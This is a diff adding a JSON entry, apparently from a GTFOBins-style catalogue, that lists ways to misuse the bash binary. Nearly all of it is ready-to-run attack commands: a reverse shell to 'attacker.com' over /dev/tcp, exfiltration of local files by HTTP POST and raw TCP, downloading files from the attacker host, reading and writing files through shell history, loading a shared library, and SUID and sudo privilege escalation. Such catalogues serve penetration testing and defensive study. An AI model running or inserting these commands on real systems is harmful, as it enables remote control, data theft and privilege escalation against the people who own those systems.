@@ -1,0 +1,69 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "bash"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run `nc -l -p 12345` on the attacker box to receive the shell.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n"
+      },
+      {
+        "description": "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"
+      },
+      {
+        "description": "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'\n"
+      },
+      {
+        "description": "This adds timestamps to the output file.",
+        "code": "LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "It trims trailing newlines and it's not binary-safe.",
+        "code": "export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'\n"
+      },
+      {
+        "description": "The read file content is surrounded by the current history content.",
+        "code": "LFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory\n"
+      }
+    ],
+    "library-load": [
+      {
+        "code": "bash -c 'enable -f ./lib.so x'"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./bash -p"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo bash"
+      }
+    ]
+  }
+}
